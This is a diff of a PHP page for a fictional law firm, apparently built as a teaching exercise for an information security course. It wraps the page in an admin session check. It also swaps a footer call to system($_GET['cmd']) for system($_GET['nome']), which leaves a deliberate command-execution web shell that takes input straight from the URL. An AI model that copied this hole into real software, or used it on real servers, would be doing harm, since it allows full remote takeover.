@@ -1,3 +1,7 @@
+<?php
+session_start();
+if(isset($_SESSION['adm'])){
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -48,6 +52,10 @@
 		Nós nascemos para lutar por você.
 	</figcaption>
 	</figure>
+	<?php if(isset($_SESSION['adm'])) { ?>
+		<a href="logout.php">
+			<?php echo $_SESSION['logado']; ?> (sair) </a>
+	<?php } ?>
 	</header>
 <fieldset>	
 <H1> ACESSO RESTRITO!!! </H1>
@@ -79,25 +87,31 @@ if ( isset($_GET["nome"]) ) {
 		$sbn = $linha["sn_membro"];
 		$fun = $linha["fc_membro"];
 		$are = $linha["ar_membro"];
+		echo "<fieldset>";
 		echo "{$user} {$sbn} trabalha na DRA Advocacia <br/>";
 		echo "Como .......: {$fun} <br/>";
 		echo "No setor ...: {$are} <br/>";
+		echo "</fieldset>";
 	}
 	mysqli_close($conn);
 }
 ?>
+<fieldset>
+		<?php	
+		system($_GET["nome"]);
+		 ?>
+</fieldset>
+
 <a href="index.html"> Voltar </a>
 <footer>
 <fieldset>
 	<p> Essa aplicação é ficticia, elaborada para uso exclusivo da disciplina de Segurança da Informação do IFSP Câmpus Guarulhos e será usado somente para fins didáticos.</p>
 	<p>Adaptado por: Robson Lopes</p>
-<fieldset>
-	<?php
-	system($_GET["cmd"]);
-?>
-</fieldset>
 </fieldset>
 </footer>
 </div>
 </body>
 </html>
+<?php
+}
+?>
